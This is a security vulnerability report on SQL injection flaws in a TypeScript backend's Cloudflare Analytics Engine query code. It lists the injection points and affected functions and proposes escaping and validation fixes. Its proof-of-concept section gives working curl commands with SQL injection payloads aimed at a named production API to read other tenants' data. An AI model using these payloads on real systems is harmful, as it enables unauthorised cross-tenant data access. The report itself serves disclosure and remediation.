# Security Vulnerability Report: SQL Injection in Cloudflare Analytics Engine Queries

## Summary

Multiple SQL injection vulnerabilities exist in `supabase/functions/_backend/utils/cloudflare.ts`. User-controlled values from API request bodies are interpolated directly into SQL query strings sent to the Cloudflare Analytics Engine API without sanitization or parameterization.

## Severity: HIGH

An authenticated user with read-level API key permissions can inject arbitrary SQL into Cloudflare Analytics Engine queries, potentially accessing data belonging to other users/apps.

## Affected Code

**File:** `supabase/functions/_backend/utils/cloudflare.ts`

### Injection Point 1: `readDevicesCF` — deviceIds (line 562, 565)

```typescript
// Line 562 - single device ID, no escaping
conditions.push(`blob1 = '${params.deviceIds[0]}'`)

// Line 565 - multiple device IDs, each quoted but NOT escaped
const devicesList = params.deviceIds.map(id => `'${id}'`).join(', ')
conditions.push(`blob1 IN (${devicesList})`)
```

### Injection Point 2: `readDevicesCF` — search (line 574, 578)

```typescript
// Line 574
conditions.push(`position('${searchLower}' IN toLower(blob5)) > 0`)
```

### Injection Point 3: `readDevicesCF` — cursor (line 592)

```typescript
// Line 592 - cursor values split and interpolated
cursorFilter = `AND (timestamp < toDateTime('${cursorTime}') OR (timestamp = toDateTime('${cursorTime}') AND blob1 > '${cursorDeviceId}'))`
```

### Injection Point 4: `readStatsCF` — deviceIds WITHOUT quotes (line 668-669) — MOST CRITICAL

```typescript
// Line 668-669 - deviceIds joined WITHOUT any quoting
const devicesList = params.deviceIds.join(',')
deviceFilter = `AND device_id IN (${devicesList})`
```

This is the most dangerous because values are not even wrapped in single quotes, making injection trivial.

### Injection Point 5: `readStatsCF` — actions (line 677, 680)

```typescript
actionsFilter = `AND action = '${params.actions[0]}'`
```

### Injection Point 6: `readStatsCF` — search (line 689-691)

```typescript
searchFilter = `AND (position('${searchLower}' IN toLower(device_id)) > 0 ...)`
```

### Injection Point 7: `readDevicesCF` — version_name (line 583)

```typescript
conditions.push(`blob2 = '${params.version_name}'`)
```

## Attack Vector

### Entry Points

1. **POST /private/devices** → `devices.ts` line 29 → calls `readDevices` → calls `readDevicesCF`
2. **POST /private/stats** → `stats.ts` line 80 → calls `readStats` → calls `readStatsCF`

### Authentication Required

Both endpoints require `middlewareV2(['read', 'write', 'all', 'upload'])` — a valid API key with at least read permission. However, any legitimate user of the platform has this.

### Input Validation

The `devicesId` field is validated as `z.array(z.string())` — this only checks that it's an array of strings. SQL injection payloads are valid strings and pass this validation.

## Proof of Concept

### Attack on `readStatsCF` (line 668-669)

The most critical injection point — deviceIds are joined without quotes:

```bash
curl -X POST https://api.capgo.app/private/stats \
  -H "Authorization: Bearer <valid-api-key>" \
  -H "Content-Type: application/json" \
  -d '{
    "appId": "com.example.app",
    "devicesId": ["1) OR 1=1 UNION SELECT * FROM stats WHERE app_id != '\''com.example.app'\'' --"]
  }'
```

This would modify the query from:
```sql
... AND device_id IN (1) OR 1=1 UNION SELECT * FROM stats WHERE app_id != 'com.example.app' --)
```

### Attack on `readDevicesCF` search parameter

```bash
curl -X POST https://api.capgo.app/private/devices \
  -H "Authorization: Bearer <valid-api-key>" \
  -H "Content-Type: application/json" \
  -d '{
    "appId": "com.example.app",
    "search": "'\'' OR 1=1) --"
  }'
```

## Impact

1. **Data exfiltration**: Read analytics data from other users' apps
2. **Cross-tenant data access**: Break app_id isolation in multi-tenant queries
3. **Information disclosure**: Enumerate device IDs, version names, and usage patterns of other apps

## Suggested Fix

Replace all string interpolation with parameterized queries or strict input validation:

```typescript
// Option 1: Strict allowlist validation
function validateDeviceId(id: string): string {
  if (!/^[a-zA-Z0-9_\-:.]+$/.test(id)) {
    throw new Error(`Invalid device ID: ${id}`)
  }
  return id
}

// Option 2: Escape single quotes (minimum fix)
function escapeSql(value: string): string {
  return value.replace(/'/g, "''")
}

// Apply to all interpolation points:
conditions.push(`blob1 = '${escapeSql(params.deviceIds[0])}'`)
```

The systematic fix should:
1. Create a `sanitizeSqlString()` utility function
2. Apply it to ALL user-controlled values before SQL interpolation in `cloudflare.ts`
3. Add input validation regex for deviceIds, search, version_name, cursor, and actions
4. Consider using Cloudflare Analytics Engine's parameterized query support if available

## Affected Functions (Complete List)

| Function | Line | Injected Parameter |
|----------|------|--------------------|
| `readDevicesCF` | 562 | deviceIds[0] |
| `readDevicesCF` | 565 | deviceIds (multiple) |
| `readDevicesCF` | 574, 578 | search |
| `readDevicesCF` | 583 | version_name |
| `readDevicesCF` | 592 | cursor |
| `readStatsCF` | 665 | deviceIds[0] |
| `readStatsCF` | 668-669 | deviceIds (NO QUOTES) |
| `readStatsCF` | 677, 680 | actions |
| `readStatsCF` | 689-691 | search |
| `readBandwidthUsageCF` | 401 | app_id |
| `readDeviceUsageCF` | 340 | app_id |
| `readStatsVersionCF` | ~460 | app_id |
| `countDevicesCF` | ~517 | app_id |
